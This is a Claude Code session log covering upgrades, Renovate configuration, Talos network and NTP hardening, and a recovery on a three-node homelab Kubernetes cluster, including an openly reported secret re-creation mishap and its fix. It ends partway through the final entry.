# Session Log

A running record of work done, files modified, and decisions made across Claude Code sessions.

---

## 2026-05-22 — `cluster-doc-sync`

### Goal
Run a cluster-doctor health diagnostic and sync CLUSTER.md component versions and ROADMAP.md completion status against live cluster state.

### What we did
- Spawned cluster-doctor agent for a full health audit; cluster all-green: 3 nodes Ready (Talos v1.13.2, K8s v1.36.1), all 27 Kustomizations and 17 HelmReleases Ready, all PVCs Bound, wildcard cert valid
- Agent identified 8 component versions in CLUSTER.md drifted ahead of documentation via Renovate auto-merges since last doc sync
- Updated CLUSTER.md section headings: Cilium (v1.17.6 → v1.19.4), CoreDNS (v1.43.0 → v1.45.2), Spegel (v0.4.0 → v0.7.1), cert-manager (v1.17.2 → v1.20.2), ESO (v0.18.2 → v2.5.0), FluxCD operator (v0.23.0 → v0.50.0), kube-prometheus-stack (v75.10.0 → v85.2.1), tuppr (v0.1.28 → v0.1.35)
- Agent confirmed metrics-server is fully deployed (HelmRelease v3.13.0, pod 1/1 Running 29h); removed from ROADMAP "In Progress" and added to Completed table
- Answered cert-manager-startupapicheck: Completed Job (7d old, no running pods); auto-cleaned on next cert-manager Helm upgrade via hook cleanup; no manual action needed; v1.17.2-labelled Job from initial install coexists with live v1.20.2 chart harmlessly

### Files changed
| File | Change |
|------|--------|
| `docs/CLUSTER.md` | 8 component version headings bumped to match live cluster |
| `docs/ROADMAP.md` | metrics-server section removed from In Progress; row added to Completed table |

---

## 2026-05-22 — `renovate-oci-tag-fix`

### Goal
Review PRs #32 and #38 (cloudflared and Envoy Gateway upgrades); identify and fix Renovate OCI tag series drift in envoy-gateway and cert-manager annotations.

### What we did
- Reviewed PR #32 (cloudflared 2025.9.0 → 2026.5.0) via `pr-upgrade-reviewer` agent; confirmed two v2026.x breaking changes (proxy-dns removal in v2026.2.0, edge-ip-version default changed to "auto" in v2026.4.0) do not apply to this cluster's config (tunnel run only, no proxy-dns, no IP version pinning); verdict: safe to merge
- Reviewed PR #38 (Envoy Gateway v1.7.3 → 1.8.0) via `pr-upgrade-reviewer` agent; six v1.8.0 breaking changes documented (CRD sub-chart split, Gateway API v1.5.1, DirectResponse interpolation, SecurityPolicy timeout semantics, samplingFraction scale, OIDC filter restructure), none intersecting with this cluster's config
- Spotted that Renovate proposed tag `1.8.0` (no `v` prefix) despite current OCIRepository tag being `v1.7.3` — verified via Docker Hub API that both `v1.8.0` and `1.8.0` exist as separate OCI artifacts with different digests; unprefixed tag is the wrong upgrade path
- Added `extractVersion=^v(?<version>.*)$` to Renovate annotation in `oci/envoy-gateway.yaml` to lock Renovate to the `v`-prefixed tag series going forward
- Audited all 11 OCI repository annotation files; found `oci/cert-manager.yaml` also tracks a `v`-prefixed tag (`v1.20.2`) with the same dual-tag pattern on quay.io; applied the same `extractVersion` fix
- Recommended closing PR #38 and letting Renovate re-open with the corrected `v1.8.0` tag (or manually patching the tag in the PR before merging)

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/oci/envoy-gateway.yaml` | Added `extractVersion=^v(?<version>.*)$` to Renovate annotation |
| `kubernetes/flux/meta/repos/oci/cert-manager.yaml` | Added `extractVersion=^v(?<version>.*)$` to Renovate annotation |

### Key decisions
- `extractVersion=^v(?<version>.*)$` chosen as the fix — it filters Renovate's tag candidates to only `v`-prefixed ones so non-prefixed tags are invisible, rather than just relying on the current tag's format to guide updates
- Audit extended proactively to all OCI repo annotation files (not just envoy-gateway) to prevent the same tag-series drift from affecting cert-manager on its next Renovate PR

---

## 2026-05-22 — `app-template-v5-review`

### Goal
Review and merge PR #33 (app-template 4.6.2 → 5.0.1 major bump) and document the v5 breaking-change schema rules across the cluster documentation.

### What we did
- Used `pr-upgrade-reviewer` agent to assess PR #33 (Renovate-generated, app-template 4.6.2 → 5.0.1)
- Agent identified 5 breaking changes in v5.0.0: `rawResources` must wrap manifests under `manifest:` key; default ServiceAccount auto-created per controller; `automountServiceAccountToken` defaults to `false`; `NetworkPolicy` `controller`/`podSelector` are mutually exclusive; `ServiceMonitor`/`PodMonitor` `jobLabel` default changed to `app.kubernetes.io/name`
- Confirmed cloudflared (the only current app-template consumer) uses none of the affected features — no values changes required pre-merge; verdict: safe to merge
- Documented v5 schema rules: full authoring reference added to `docs/CONVENTIONS.md`; brief pointer added under GitOps Conventions in `CLAUDE.md`; version inventory entry added to `docs/CLUSTER.md`
- Decided CONVENTIONS.md was the correct home for detailed schema rules, consistent with the existing pattern where CLAUDE.md holds summary pointers and CONVENTIONS.md holds detailed authoring reference material

### Files changed
| File | Change |
|------|--------|
| `docs/CONVENTIONS.md` | Added app-template v5 section with 5 breaking rules, code examples, and upstream docs link |
| `CLAUDE.md` | Added brief app-template v5 pointer under GitOps Conventions |
| `docs/CLUSTER.md` | Added app-template shared chart library inventory entry under Running Components |

### Key decisions
- Schema details placed in `CONVENTIONS.md` rather than `CLAUDE.md` — CONVENTIONS.md is explicitly the "Extended Reference" supplement; keeping CLAUDE.md as a pointer index avoids bloating it with per-chart schema reference material

---

## 2026-05-22 — `connect-upgrade-fix`

### Goal
Review PRs #29 and #30, fix a pre-existing double-encoding bug in the 1Password Connect credentials secret, merge the Connect upgrade, and recover from a post-merge ClusterSecretStore outage.

### What we did
- Reviewed PR #29 (cert-manager v1.17.2→v1.20.2) and PR #30 (1Password Connect 2.0.1→2.4.1) using parallel `pr-upgrade-reviewer` agents
- PR #29 flagged CAUTION: `RotationPolicy` default flipped `Never→Always` in v1.18, and `issuerRef` API defaults re-introduced in v1.20 — provided two `kubectl` audit commands to run before merging
- PR #30 flagged CAUTION: chart v2.3.0 removed the double-base64 workaround for the credentials file — verified secret encoding to confirm impact
- Confirmed the live `onepassword-connect-secrets` secret was double-encoded (`base64(base64(json))`) — the bootstrap task explicitly piped `| base64 -w 0`, then Kubernetes added a second layer; old chart stripped one layer internally
- Explained the issue in depth: old chart read credentials via env var (expected base64 string, decoded it); new chart mounts as a plain file (no decode — single encoding required)
- Fixed the secret before merging: extracted inner JSON via double-decode, deleted and re-created the secret with single encoding, restarted Connect, confirmed `ClusterSecretStore` was `Ready=True` on chart v2.0.1
- Merged PR #30; Helm upgrade to connect@2.4.1 succeeded cleanly (`v3` release)
- Post-merge: `ClusterSecretStore` went `NotReady` with `cannot find secret data for key: "token"` — the Connect API token used by ESO had been dropped when the secret was re-created
- Diagnosed: original secret held two keys (`1password-credentials.json` + `token`); re-creation only restored the credentials file
- Recovery: read token from `op://homelab/HomeLab Access Token/credential`, patched the live secret, force-annotated `ClusterSecretStore` to trigger immediate ESO reconciliation — `Ready=True` within 10 seconds
- Updated the bootstrap task to remove `| base64 -w 0` so future re-bootstrap creates a correctly single-encoded secret

### Files changed
| File | Change |
|------|--------|
| `.taskfiles/bootstrap/Taskfile.yaml` | Removed `\| base64 -w 0` from credentials read in `onepassword-connect-secret` task |

### Key decisions
- Fixed and validated the secret encoding on the *old* chart first, before merging — proved Connect still worked with single-encoding under v2.0.1, reducing risk of a combined encoding + upgrade failure
- After the missing `token` was found post-upgrade, patched the existing secret rather than deleting-and-recreating to avoid dropping the credentials file a second time
- Used a `force-sync` annotation on the `ClusterSecretStore` to trigger immediate ESO reconciliation rather than waiting up to the natural polling interval

---

## 2026-05-22 — `renovate-pr-triage`

### Goal
Triage all open Renovate minor/patch PRs using parallel pr-upgrade-reviewer agents and harden the Renovate soak policy to close a gap where container image minors had no minimumReleaseAge.

### What we did
- Queried GitHub for all open Renovate PRs labelled `type/minor` or `type/patch` — found 9 PRs (#21, #22, #23, #24, #25, #26, #28, #29, #30)
- Launched 9 `pr-upgrade-reviewer` agents in parallel, one per PR, to assess upgrade risk
- Consolidated results: **4 SAFE** (#21 flux, #25 app-template, #26 coredns, #28 spegel), **3 CAUTION** (#22 cilium, #29 cert-manager, #30 1Password Connect), **2 HOLD** (#23 cloudflared, #24 envoy gateway)
- HOLD details: #23 stale — target `2025.11.1` is 6 months old, latest is `2026.5.0`; #24 — no release notes published, tag format anomaly (`1.8.0` vs `v1.7.3`), CRD sub-chart split, K8s v1.36 outside documented support matrix
- CAUTION details: #22 cilium requires 3 pre-merge kubectl checks (BGPv1 removal, v2alpha1 apiVersion, `FromRequires`/`ToRequires` CNP fields); #29 cert-manager `rotationPolicy` default flipped `Never→Always` in v1.18; #30 1Password Connect v2.3.0 fixed double-base64 encoding — verify secret was single-encoded
- Identified gap: container image minor/patch updates (non-Talos/K8s) had no `minimumReleaseAge` — only protected by the weekly schedule (0–7 day window), allowing PRs to open against incompletely-published releases
- Added a 3-day soak gate to `renovate.json5` for all container minor/patch updates excluding `siderolabs/installer` and `siderolabs/kubelet`; committed `4df7f84`

### Files changed
| File | Change |
|------|--------|
| `renovate.json5` | Added `minimumReleaseAge: "3 days"` gate rule for container image minor/patch updates |

### Key decisions
- Used 9 parallel `pr-upgrade-reviewer` agents rather than a `/loop` — more efficient for a fixed known list; `/loop` is designed for time-based recurrence, not list iteration
- New soak rule uses `matchPackageNames` negation exclusions to avoid interfering with the existing 5-day soak rules for Talos/K8s, which are higher-priority and more restrictive

---

## 2026-05-22 — `kps-upgrade-85`

### Goal
Review, plan, and execute the kube-prometheus-stack upgrade from 75.10.0 to 85.2.1 (Renovate PR #34), safely sequencing CRD updates across 6 prometheus-operator minor bumps.

### What we did
- Ran `pr-upgrade-reviewer` agent on PR #34; identified 10 chart-major / 6 prometheus-operator-minor jump (v0.84.1 → v0.90.1) requires chart-native `crds.upgradeJob` pre-upgrade hook rather than relying solely on the global `crds: CreateReplace` Flux patch
- Verified `allowSchedulingOnControlPlanes: true` (in `talos/patches/controller/cluster.yaml`) removes the control-plane taint entirely — nodes have no taints; initial plan's `tolerations` block for `upgradeJob` was dropped
- Added `crds.enabled: true` + `crds.upgradeJob.enabled: true` to `values.yaml`; committed `7136a02` and pushed to main ahead of the PR merge
- Confirmed Flux reconciled the values change at 75.10.0 (HelmRelease advanced to release v2, "Helm upgrade succeeded"); ConfigMap verified to contain new `crds:` block
- Merged PR #34; upgrade completed to 85.2.1 — all 7 pods healthy, Prometheus CR `Reconciled: True` (distroless `v3.11.3`), Alertmanager CR `Reconciled: True` (`v0.32.1`)

### Files changed
| File | Change |
|------|--------|
| `kubernetes/apps/observability/kube-prometheus-stack/app/helm/values.yaml` | Added `crds.upgradeJob.enabled: true` block at top of file |

### Key decisions
- Dropped `crds.upgradeJob.tolerations` from the plan after live verification: `allowSchedulingOnControlPlanes: true` removes the taint outright; existing tolerations throughout `values.yaml` are redundant artefacts from chart defaults
- Committed values change to main before merging the OCIRepository tag PR so Flux could verify the Job wiring at the current version before the 10-version jump landed; treats the upgrade as forward-only (CRD downgrade not feasible after)

---

## 2026-05-22 — `renovate-improvements`

### Goal
Review the Renovate configuration and implement five targeted improvements: auto-merge rules for Helm patches and image digests, a kustomize manager regex fix, package grouping for major stacks, and release soak periods for Talos and Kubernetes.

### What we did
- Reviewed `renovate.json5` against `docs/ROADMAP.md` to identify 6 improvement opportunities
- Fixed a silent bug in the kustomize manager: regex `^kustomization` only matched the root-level file; changed to `(^|/)kustomization` so all `kustomization.yaml` files under `kubernetes/apps/` are now scanned by Renovate
- Added auto-merge for Helm chart patch updates after a 3-day community soak — eliminates the majority of patch PRs silently via `automergeType: "branch"`
- Added auto-merge for container image digest updates after a 1-day soak (digest = same tag, new SHA; no version change); excluded `siderolabs/installer` and `siderolabs/kubelet` which go through tuppr
- Added `minimumReleaseAge: "5 days"` to Talos and Kubernetes rules so PRs don't open until the community has had time to surface regressions in OS/runtime releases
- Added grouping rules for 5 previously ungrouped stacks: Longhorn, kube-prometheus-stack, Envoy Gateway, ExternalDNS, External Secrets
- Evaluated `.renovate/` config split (improvement 6) — determined it requires proper Renovate local preset format (not a raw file drop), adds real complexity at the current file size (~282 lines); deferred with a threshold of ~400 lines
- Expanded the existing ROADMAP stub for the Renovate config split with correct preset mechanics, exact `extends` syntax, concrete per-file split plan, and trigger threshold

### Files changed
| File | Change |
|------|--------|
| `renovate.json5` | Auto-merge rules (Helm patch + digest), kustomize regex fix, 5 new group rules, 5-day soak on Talos/K8s |
| `docs/ROADMAP.md` | Expanded Renovate config split entry with local preset mechanics and step-by-step implementation guide |

### Key decisions
- Excluded `siderolabs/installer` and `siderolabs/kubelet` from digest auto-merge — even a same-SHA digest refresh on those images warrants awareness given they go through tuppr's upgrade machinery
- Chose 5-day soak for Talos/K8s (vs 3-day for charts) — OS and runtime regressions are harder to recover from and community reports tend to appear later than chart issues
- Deferred `.renovate/` split: the key non-obvious blocker is that split files must be valid Renovate presets referenced via `extends`, not raw fragments auto-scanned from the directory — the refactor has real cost and the file is still manageable

---

## 2026-05-22 — `talos-audit-ntp`

### Goal
Cluster health check and Talos config/schematic audit via cluster-doctor; implement the NTP server expansion (Finding 2.6) with 4 EU/NL-prioritised sources applied live across all nodes.

### What we did
- Reviewed cluster status and roadmap after a 2-day gap; confirmed Green health and identified Talos config/schematic audit as the top priority before proceeding with new deployments
- Ran cluster-doctor agent for combined live cluster health audit + full Talos config/schematic review:
  - All 3 nodes Ready (Talos v1.13.2, K8s v1.36.1); all 26 Kustomizations + 17 HelmReleases True; both Longhorn volumes Healthy on cp-01 + cp-03
  - Elevated restart counts on several pods identified as historical artefacts from the 2026-05-15 recovery incident, not ongoing instability
  - Schematic verified clean: `iscsi-tools`, `util-linux-tools`, `intel-ucode`, `amd-ucode` all present; no missing extensions for the hardware profile
  - Sysctls (10 GbE socket buffers), NFS defaults, etcd subnet restrictions, cluster.yaml, machine-features all verified correct
  - 6 findings produced: 2.1 (bond driver-glob selectors on cp-01/cp-02), 2.6 (only 2 NTP sources), 2.3/2.5 deferred, 3.x acceptable-as-is
- Planned and implemented Finding 2.6 — expanded NTP from 2 to 4 sources with EU/NL preference:
  - Added `ntp.time.nl` (SIDN/NLNOG Dutch stratum 1) and `nl.pool.ntp.org` (NL zone pool) to replace generic `pool.ntp.org`; kept `time.cloudflare.com`; added `time.google.com` for AS diversity
  - Applied staggered (cp-01 → cp-02 → cp-03); all nodes applied without reboot and stayed Ready throughout
  - Verified: `TimeServerStatus` shows all 4 servers on all 3 nodes; `TimeStatus SYNCED: true` on all nodes

### Files changed
| File | Change |
|------|--------|
| `talos/patches/global/machine-time.yaml` | Expanded NTP servers from 2 to 4 (EU/NL preference) |

### Key decisions
- Chose `ntp.time.nl` (operated by SIDN + NLNOG) as the primary NL-specific source — the most authoritative Dutch stratum-1 server available publicly, not a generic pool alias
- Replaced `pool.ntp.org` with `nl.pool.ntp.org` for geographic locality; kept `time.cloudflare.com` (AS13335) and added `time.google.com` (AS15169) so the two anycast sources come from independent autonomous systems
- 4 distinct sources unlocks chrony's Marzullo algorithm for falseticker detection; with only 2 sources chrony can detect disagreement but cannot identify which server is wrong

---

## 2026-05-21 — `storage-bond-validation`

### Goal
Verify the bond-selector-hardening fix end-to-end: confirm Longhorn volumes recovered on cp-03, diagnose a UniFi switch UI display artefact, and validate all three storage bond pairs achieve ~18-19 Gbps aggregate throughput via iperf3.

### What we did
- Uncordoned cp-03 post-reboot (found it already uncordoned); confirmed all 4 Longhorn replicas (2 per volume, cp-01 + cp-03) back in `running` state and both volumes `healthy`
- Investigated UniFi switch showing ports 14 and 16 (cp-01/cp-02 second SFP+ ports) as "Auto"/grey — read `/proc/net/bonding/bond0` on both nodes; confirmed `Number of ports: 2` and LACP port state `63` (fully active+distributing) on both slaves of both bonds; switch UI artefact explained: secondary bond slave has no independent ARP-learned IP so switch shows stale/unknown MAC and no speed
- Ran iperf3 bandwidth tests across all three storage bond pairs using `hostNetwork: true` pods bound to `10.200.0.x` IPs, 8 parallel streams to distribute across both bond members via layer3+4 hashing:
  - cp-03 → cp-01 (X710 bond1 ↔ X520 bond0): **18.2 Gbps**
  - cp-02 → cp-01 (X520 bond0 ↔ X520 bond0): **18.7 Gbps**
  - cp-03 → cp-02 (X710 bond1 ↔ X520 bond0): **18.7 Gbps**
- All three pairs sustain ~18-19 Gbps against a 20 Gbps theoretical max; bond-selector fix confirmed working end-to-end across all nodes

### Files changed

No files changed — session was purely operational/diagnostic.

### Key decisions
- Used 8 parallel iperf3 streams (`-P 8`) rather than a single stream: layer3+4 hashing only varies by src/dst port, so a single stream always goes out one bond member (~10 Gbps max); 8 streams statistically distribute across both members to measure aggregate throughput
- Ran pods with `hostNetwork: true` bound explicitly to storage VLAN IPs (`--bind 10.200.0.x`) to ensure traffic traverses the bond interfaces rather than the management LAN

---

## 2026-05-21 — `bond-selector-hardening`

### Goal
Harden Talos bond deviceSelectors from driver-glob to hardwareAddr on all nodes, discovering and fixing a silent bug where cp-03's 10 GbE storage bond had never formed since cluster build.

### What we did
- Reviewed cluster status after a few days' gap (ROADMAP, CLUSTER.md, git log); identified Grafana, Alertmanager, Talos config audit, and cp-02 drive as next priorities; elected Talos config audit as top priority before adding further deployments
- Ran cluster-doctor live audit: all 3 nodes Ready (Talos v1.13.2 / K8s v1.36.1), all 26 Kustomizations True, all 17 HelmReleases Ready; Longhorn volumes healthy; elevated restart counts on several pods are historical artefacts from the May 15 recovery incident, not ongoing instability
- Ran full Talos config/schematic audit via cluster-doctor: schematic clean; identified driver-glob bond selectors (Finding 2.1) as top PR priority and NTP source count (Finding 2.6) as second
- Fetched live MACs from `talosctl get links` for cp-01/cp-02; fetched permanent MACs via `talosctl read /proc/net/bonding/bond0` for cp-03 — LACP MAC propagation masked enp4s0's permanent address (`38:05:25:33:c9:74`) behind the bond MAC in `get links`
- Replaced all driver-based bond `deviceSelectors` with per-port `hardwareAddr` selectors in `talconfig.yaml`; removed the shared `&ixgbe-storage-bond` YAML anchor that had prevented per-node MAC selectors on cp-01/cp-02
- Discovered cp-03 bond1 (Intel X710/i40e, `10.200.0.203/24`) had never formed since cluster build: single `driver: i40e` entry matched both X710 ports simultaneously; Talos's `LinkAliasConfigController` logs "link selector matched multiple links, skipping" and skips the alias assignment — with no member interfaces enslaved, bond1 stayed permanently down; Longhorn replication to cp-03 was falling back to the 1 GbE management LAN
- Applied configs one node at a time (cp-01 → cp-02 → cp-03); cp-03 apply brought bond1 up and `10.200.0.203/24` online for the first time; Longhorn volumes remained Healthy throughout
- Investigated `name:` interface selectors to eliminate post-enslavement alias warnings; found talhelper only generates `LinkAliasConfig` documents (required for bond member enslavement) for `hardwareAddr`/`driver` selectors — `name:` leaves `BondConfig` with dangling `bond0-m0`/`bond0-m1` references and bonds silently fail to enslave any interfaces; reverted to `hardwareAddr`
- Documented the talhelper limitation in config comments; confirmed remaining "matched multiple links" warnings are cosmetic — they occur on the alias controller's post-enslavement retry when LACP has propagated the bond MAC to both slaves, but bonds form correctly on initial enslavement

### Files changed
| File | Change |
|------|--------|
| `talos/talconfig.yaml` | Replaced all bond deviceSelectors with hardwareAddr (all 3 nodes, all bonds); documented talhelper name: selector limitation |

### Key decisions
- `hardwareAddr` over `name:` selectors: talhelper only emits `LinkAliasConfig` for hardwareAddr/driver selector types; `name:` produces `BondConfig` with dangling member alias references and no physical interface mapping — bonds do not form
- Permanent MACs sourced from `/proc/net/bonding` rather than `talosctl get links`: in 802.3ad mode `get links` shows the bond MAC on all enslaved interfaces; `/proc/net/bonding` reports the `Permanent HW addr` field which survives bonding
- Two separate commits (fix + docs): the talhelper generator constraint is a non-obvious operational fact worth recording in commit history independently from the functional fix

---

## 2026-05-21 — `talos-config-audit`

### Goal
Audit and harden Talos node config (sysctls, kubelet limits, PodSecurity, bond timing, topology labels) following a cluster-doctor live verification pass after a 5-day gap.

### What we did
- Reviewed ROADMAP, CLUSTER.md, and recent git log for cluster status after a 5-day absence; identified Grafana, Alertmanager receiver, Talos config audit, and cp-02 drive as next priorities
- Ran cluster-doctor live audit: all 3 nodes Ready (v1.36.1/v1.13.2), all 27 Kustomizations True, all HelmReleases Ready; Longhorn PVCs auto-salvaged after a brief disruption and recovered healthy; ESO 1Password Connect events were transient post-restart noise
- Ran full Talos config/schematic audit: schematic confirmed clean (iscsi-tools, util-linux-tools, intel/amd ucode all live on all nodes); identified sysctls undersized for 10 GbE, missing kubelet eviction/reservation config, PodSecurity disabled, missing bond timing params, and missing topology labels
- Tuned TCP socket buffers in `machine-sysctls.yaml`: raised `rmem_max`/`wmem_max` from 7.5 MiB → 128 MiB; added `tcp_rmem`/`tcp_wmem`/`netdev_max_backlog`; added `tcp_slow_start_after_idle=0` and `tcp_no_metrics_save=1` for Longhorn gRPC replication behaviour (cwnd preservation across bursts, fresh start on replica reconnect)
- Added kubelet eviction and reservation config in `machine-kubelet.yaml`: `evictionHard` (memory.available 500Mi, nodefs.available 10%), `kubeReserved`/`systemReserved` to protect etcd and apiserver under memory pressure; raised `maxPods` to 250
- Enabled PodSecurity admission in observe mode in `admission-controller-patch.yaml`: `enforce: privileged` (nothing blocked), `audit/warn: baseline` (violations logged and surfaced via kubectl); switched from `admissionControl: []` (all plugins disabled)
- Added topology `region`/`zone` node labels to all three CP nodes in `talconfig.yaml` (`topology.kubernetes.io/region: homelab`, unique zone per node `homelab-cp-0X`); resolves Spegel `TopologyAwareHintsDisabled` warning and enables zone-aware scheduling hints
- Set `upDelay`/`downDelay` to 200ms (2× miimon) on all LACP bonds in `talconfig.yaml`; silences talhelper warnings about unset hysteresis on all three nodes' bonds
- Migrated 6 read-only entries from gitignored `settings.local.json` into shared `.claude/settings.json`; added `/session-log` retroactive session recording skill
- Added ROADMAP items for two new cluster-doctor findings: kustomize-controller both replicas on cp-02 (spread constraint not enforcing), envoy-gateway single replica on cp-03 (SPOF for xDS updates)

### Files changed
| File | Change |
|------|--------|
| `talos/patches/global/machine-sysctls.yaml` | Raised socket buffer ceiling to 128 MiB; added tcp_rmem/wmem, netdev_max_backlog, tcp replication knobs |
| `talos/patches/global/machine-kubelet.yaml` | Added evictionHard thresholds, kubeReserved/systemReserved, maxPods: 250 |
| `talos/patches/controller/admission-controller-patch.yaml` | PodSecurity observe mode (enforce: privileged, audit/warn: baseline) |
| `talos/talconfig.yaml` | Added topology region/zone labels + bond upDelay/downDelay 200ms on all nodes |
| `docs/ROADMAP.md` | Added kustomize-controller co-location and envoy-gateway single-replica ROADMAP items |
| `.claude/settings.json` | Migrated local settings entries to shared allowlist; added new read-only tool entries |
| `.claude/commands/session-log.md` | Added /session-log retroactive session recording skill |
| `.claude/agent-memory/pr-upgrade-reviewer/MEMORY.md` | Added flux-operator upgrade quirks memory pointer |
| `.claude/agent-memory/pr-upgrade-reviewer/project_flux_operator_upgrade_quirks.md` | New memory: flux-operator upgrade quirks (stale Helm secrets, CRD deletion cascade) |

### Key decisions
- PodSecurity set to observe mode (`enforce: privileged`) rather than enforcement — homelab workloads include many privileged containers; audit/warn surfaces violations without disrupting running pods; enforcement can be tightened per-namespace later
- Zone labels scoped one-per-node (`homelab-cp-01/02/03`) rather than shared zone — equivalent to hostname-keyed spread but enables zone-aware hint features; Spegel warning resolved without any functional trade-off
- `tcp_slow_start_after_idle=0` + `tcp_no_metrics_save=1` added specifically for Longhorn gRPC replication: idle replicas re-enter slow start after gaps between replication bursts (0 prevents this); stale RTT metrics from a faulted replica would throttle reconnect (1 discards them on close)
- Bond delay 200ms = 2× miimon interval (100ms) — standard LACP hysteresis ratio per 802.3ad spec; prevents link-flap false positives on brief interruptions

---

## 2026-05-16 — `topology-spread`

### Goal
Implement topologySpreadConstraints for multi-replica deployments (coredns, envoy-external, envoy-internal) and stateless controllers (Flux, ESO, cert-manager) to reduce scheduling concentration on cp-03.

### What we did
- Explained topologySpreadConstraints, maxSkew, DoNotSchedule vs ScheduleAnyway, matchLabelKeys, and leader-election failover mechanics to build mental model before implementing
- Scaled coredns from 2 → 3 replicas with DoNotSchedule topology spread (1 pod per node)
- Scaled envoy-external and envoy-internal to 3 replicas via EnvoyProxy CR with topology spread; `matchLabelKeys: [pod-template-hash]` ensures each gateway's 3 pods spread independently (separate hash → separate counts)
- Scaled Flux helm-controller, kustomize-controller, notification-controller to 2 replicas; injected shared pod label `app.kubernetes.io/part-of: flux` via kustomize JSON patch; added DoNotSchedule topology spread scoped to that label group
- Scaled cert-manager controller, webhook, and cainjector to 2 replicas each with DoNotSchedule topology spread; 6-pod/3-node = 2/2/2, `matchLabelKeys` added for rolling upgrade safety
- Scaled ESO controller, webhook, and certController to 2 replicas each; noted ESO runs concurrent mode (no leader election — both replicas always active, zero failover delay)
- After first commit (`401d601`), cluster-doctor diagnosed source-controller permanently NotReady at replicas:2: the artifact HTTP server (port 9090) only starts on the leader; non-leader replica always fails its readiness probe
- Fixed by removing source-controller (and flux-operator) from the replicas and topology patches; also scoped the shared-label injection to the 3 scalable controllers only so the 6-pod group yields a perfect 2/2/2 split
- Switched Flux topology from ScheduleAnyway to DoNotSchedule in the fix commit (`d5d2946`): ScheduleAnyway was originally chosen because asymmetric label contamination (source-controller and flux-operator in the group) blocked DoNotSchedule; fixing the label scope made DoNotSchedule safe
- Updated ROADMAP.md: marked Pod Topology section ✅, replaced planning content with "What was implemented" tables documenting before/after replica counts and failover times
- Verified full cluster reconciliation: all 27/27 Kustomizations True at commit `d5d2946`

### Files changed
| File | Change |
|------|--------|
| `kubernetes/apps/kube-system/coredns/app/helm/values.yaml` | 2 → 3 replicas; 1-per-node DoNotSchedule topology spread |
| `kubernetes/apps/network/envoy-gateway/config/envoy.yaml` | 2 → 3 replicas in EnvoyProxy CR; topology spread with matchLabelKeys |
| `kubernetes/apps/flux-system/flux-instance/app/helm/values.yaml` | Added 3 kustomize patches: shared label, replicas:2, DoNotSchedule spread (3 scalable controllers only) |
| `kubernetes/apps/cert-manager/cert-manager/app/helm/values.yaml` | replicaCount:2 + DoNotSchedule topology spread for controller/webhook/cainjector |
| `kubernetes/apps/external-secrets/external-secrets/app/helm/values.yaml` | replicaCount:2 + DoNotSchedule topology spread for controller/webhook/certController |
| `docs/ROADMAP.md` | Pod Topology section marked ✅; replaced planning text with implemented-state tables |
| `docs/SESSIONS.md` | Added topology-spread session stub |
| `CLAUDE.md` | Added topology-spread session log row |

### Key decisions
- source-controller excluded from HA scaling: readiness probe hits the artifact HTTP server (port 9090) which only the leader starts — non-leader replicas are always NotReady by design, making the Deployment permanently stuck at 1/2 Ready
- flux-operator excluded from HA scaling: manages the FluxInstance CR only, no operational HA benefit; including it in the label group would inflate per-node counts and break DoNotSchedule placement math
- Shared pod label scoped to exactly 3 scalable controllers (6 pods / 3 nodes = 2/2/2) — this perfect split is what makes DoNotSchedule safe; any asymmetric unconstrained pod in the group would inflate counts and cause Pending
- `matchLabelKeys` omitted from Flux topology spread: not needed because DoNotSchedule already prevents co-location; adding it would overconstrain during rolling upgrades without adding safety
- Switched from ScheduleAnyway → DoNotSchedule for Flux once the label scope was corrected — ScheduleAnyway (soft) allowed both helm-controller replicas to land on cp-03 simultaneously when scheduled at the same time

---

## 2026-05-15 — `cluster-health-audit`

### Goal
Perform a thorough cluster health audit via the cluster-doctor agent, explore FreeLens/Kubernetes concepts, and document any actionable findings.

### What we did
- Explained FreeLens Managed Fields panel: Server-Side Apply field ownership model, how `helm-controller` and `kube-controller-manager` split ownership, and why this is the mechanism behind GitOps drift detection
- Ran cluster-doctor for a full cluster inspection (59 tool calls across all namespaces): confirmed 26/26 Kustomizations, 17/17 HelmReleases, 3/3 nodes all healthy; no PVCs unbound, no pods in error
- Reviewed all 20 findings: key flags — Flux v2.6.4 outdated (v2.8.7 available), Prometheus + Alertmanager both scheduled on cp-03 (concentration risk), pod scheduling skew (41 pods on cp-03 vs 18/16 on others), cp-02 still has no storage disk
- Confirmed `longhorn-single` StorageClass `Retain` policy is intentional — the StorageClass comment documents the design rationale explicitly; cluster-doctor finding was a false alarm
- Confirmed K8s v1.36.1 is an intentional upgrade (not a Renovate pre-release mistake)
- Discussed whether demoting cp-03 to a worker node would improve scheduling balance — concluded no: collapses 3-node etcd to 2-node (zero fault tolerance), and concentration is resource-driven not role-driven so the skew would persist
- Added Pod Topology section to ROADMAP.md: root cause (WaitForFirstConsumer + resource asymmetry), stateless fix path (topologySpreadConstraints on Flux/ESO/cert-manager controllers), accept-current-state guidance for existing Prometheus/Alertmanager volumes
- cluster-doctor auto-updated its CLUSTER-STATE-AUTO block: Talos v1.13.2, K8s v1.36.1, expanded namespace table, corrected storage class table, kube-vip static-pod clarification

### Files changed
| File | Change |
|------|--------|
| `docs/ROADMAP.md` | Added Pod Topology: Scheduling Concentration on cp-03 section |
| `.claude/agents/cluster-doctor.md` | Auto-updated CLUSTER-STATE-AUTO: versions, namespace table, storage class table, kube-vip static-pod note |

### Key decisions
- `longhorn-single` Retain policy is not a bug — the file comment documents it as intentional for apps (e.g. CloudNativePG) that manage irreplaceable data with application-level replication
- Rejected demoting cp-03 to worker: 2-node etcd has zero fault tolerance (Raft requires majority quorum), and pod concentration would remain since it is driven by resource availability not node role
- Prometheus/Alertmanager volume stickiness accepted: WaitForFirstConsumer + Longhorn single-attachment makes migration require VolSync; fix forward with topologySpreadConstraints on all future stateful deployments

---

## 2026-05-15 — `cluster-recovery-2026-05-15`

### Goal
Diagnose and recover from full cluster collapse triggered by the metrics-server OCIRepository misconfiguration, which cascaded into simultaneous loss of Cilium, CoreDNS, Flux, and multiple dependent workloads. Document all findings and lessons learned.

### What we did
- Diagnosed root cause: OCIRepository pointing at `ghcr.io/kubernetes-sigs/charts/metrics-server` (path does not exist) returned `DENIED`, blocked `cluster-meta` health check, and — after a Kustomization finalizer was bypassed to unblock — triggered a cascade deletion of all `cluster-apps` children including Cilium and CoreDNS
- Manually reinstalled Cilium via `helm install` (uses `hostNetwork:true`, no CNI needed); verified all three DaemonSet pods Running before proceeding
- Manually reinstalled CoreDNS via `helm upgrade --install` from OCI; DNS resolution restored for source-controller
